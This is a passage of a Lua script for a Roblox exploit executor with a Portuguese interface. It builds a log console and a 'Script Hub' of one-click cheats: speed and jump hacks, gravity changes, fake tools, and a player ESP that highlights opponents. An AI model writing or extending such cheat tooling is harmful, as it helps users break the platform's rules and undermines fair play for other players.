        pcall(setclipboard, full)
        Nexus:AddLog("Log copiado!", "success")
    end)

    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0, 120, 0, 32)
    clearBtn.Position = UDim2.new(1, -140, 1, -48)
    clearBtn.BackgroundColor3 = DS.colors.error
    clearBtn.Text = "🗑️ LIMPAR"
    clearBtn.TextColor3 = Color3.fromRGB(255,255,255)
    clearBtn.Font = DS.font.main
    clearBtn.TextSize = DS.fontSize.body
    clearBtn.Parent = consoleFrame
    clearBtn.MouseButton1Click:Connect(function()
        Nexus.consoleLogs = {}
        Nexus.updateConsoleUI()
        Nexus:AddLog("Console limpo.", "info")
    end)

    function Nexus.updateConsoleUI()
        local str = ""
        for i = math.max(1, #Nexus.consoleLogs - 200), #Nexus.consoleLogs do
            str = str .. Nexus.consoleLogs[i].text .. "\n"
        end
        consoleText.Text = str
        consoleScroller.CanvasSize = UDim2.new(0,0,0, consoleText.TextBounds.Y + 30)
        consoleScroller.CanvasPosition = Vector2.new(0, consoleScroller.CanvasSize.Y.Offset)
    end
    Nexus.updateConsoleUI()

    -- ==================== ABA SCRIPT HUB ====================
    local hubFrame = contentFrames[5]
    local hubCard = Instance.new("Frame")
    hubCard.Size = UDim2.new(1, -40, 1, -40)
    hubCard.Position = UDim2.new(0, 20, 0, 20)
    hubCard.BackgroundColor3 = DS.colors.surface
    hubCard.BorderSizePixel = 0
    hubCard.Parent = hubFrame
    local hCorner = Instance.new("UICorner")
    hCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    hCorner.Parent = hubCard

    local hubTitle = Instance.new("TextLabel")
    hubTitle.Size = UDim2.new(1, -20, 0, 32)
    hubTitle.Position = UDim2.new(0, 12, 0, 10)
    hubTitle.BackgroundTransparency = 1
    hubTitle.Text = "📦 Script Hub — Utilitários Prontos"
    hubTitle.TextColor3 = DS.colors.primary
    hubTitle.Font = DS.font.main
    hubTitle.TextSize = DS.fontSize.title
    hubTitle.TextXAlignment = Enum.TextXAlignment.Left
    hubTitle.Parent = hubCard

    local hubList = Instance.new("ScrollingFrame")
    hubList.Size = UDim2.new(1, -24, 1, -50)
    hubList.Position = UDim2.new(0, 12, 0, 46)
    hubList.BackgroundColor3 = DS.colors.background
    hubList.BorderSizePixel = 0
    hubList.ScrollBarThickness = 6
    hubList.CanvasSize = UDim2.new(0,0,0,0)
    hubList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    hubList.Parent = hubCard
    local hlCorner = Instance.new("UICorner")
    hlCorner.CornerRadius = UDim.new(0, DS.radius.small)
    hlCorner.Parent = hubList
    local hlLayout = Instance.new("UIListLayout")
    hlLayout.Padding = UDim.new(0, 6)
    hlLayout.Parent = hubList

    local scripts = {
        {name = "Infinite Jump", code = [[
            local p = game:GetService("Players").LocalPlayer
            local h = p.Character and p.Character:FindFirstChild("Humanoid")
            if h then h.JumpPower = 100; h.Jump = true end
        ]]},
        {name = "Super Speed (WS)", code = [[
            local p = game:GetService("Players").LocalPlayer
            local h = p.Character and p.Character:FindFirstChild("Humanoid")
            if h then h.WalkSpeed = 100 end
        ]]},
        {name = "Gravity (0.1)", code = [[
            game:GetService("Workspace").Gravity = 0.1
        ]]},
        {name = "Reset Gravity", code = [[
            game:GetService("Workspace").Gravity = 196.2
        ]]},
        {name = "Btools (Give)", code = [[
            local p = game:GetService("Players").LocalPlayer
            if p.Character then
                local tools = {"Hammer", "Weld", "Arrow", "Crate"}
                for _, t in ipairs(tools) do
                    local b = Instance.new("Tool")
                    b.Name = t
                    b.Parent = p.Character
                end
            end
        ]]},
        {name = "Remove All Tools", code = [[
            local p = game:GetService("Players").LocalPlayer
            if p.Character then
                for _, v in pairs(p.Character:GetChildren()) do
                    if v:IsA("Tool") then v:Destroy() end
                end
            end
        ]]},
        {name = "ESP Player (Client)", code = [[
            local p = game:GetService("Players")
            for _, plr in pairs(p:GetPlayers()) do
                if plr ~= p.LocalPlayer and plr.Character then
                    local h = plr.Character:FindFirstChild("Head")
                    if h then
                        local hl = Instance.new("Highlight")
                        hl.FillColor = Color3.new(1,0,0)
                        hl.OutlineColor = Color3.new(1,1,1)
                        hl.FillTransparency = 0.5
                        hl.Parent = h
                    end
                end
            end
        ]]}
    }

    for _, s in ipairs(scripts) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 36)
        btn.BackgroundColor3 = DS.colors.surfaceLight
        btn.Text = s.name
        btn.TextColor3 = DS.colors.text
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = hubList
        local bCorner = Instance.new("UICorner")
        bCorner.CornerRadius = UDim.new(0, DS.radius.small)
        bCorner.Parent = btn
        btn.MouseButton1Click:Connect(function()
            Nexus:ExecuteClient(s.code)
            Nexus:AddLog("Script Hub: " .. s.name .. " executado", "success")
        end)
    end

    return gui
end

-- ============================================================================
-- INICIALIZAÇÃO
-- ============================================================================
local function init()
    Nexus:AddLog("═══════════════════════════════════════════════════", "info")
    Nexus:AddLog("  NEXUS OMEGA XT v7.0 — Interface Ultimate", "success")
    Nexus:AddLog("═══════════════════════════════════════════════════", "info")
    Nexus.mainGui = createMainUI()
    if Nexus.mainGui then
        Nexus:AddLog("Interface carregada com sucesso.", "success")
        Nexus:AddLog("Minimize para bolinha arrastável.", "info")
        Nexus:AddLog("Clique com botão direito na bolinha para menu rápido.", "info")
    else
        Nexus:AddLog("Falha ao criar interface.", "error")
    end
    getgenv().Nexus = Nexus
end

pcall(init)
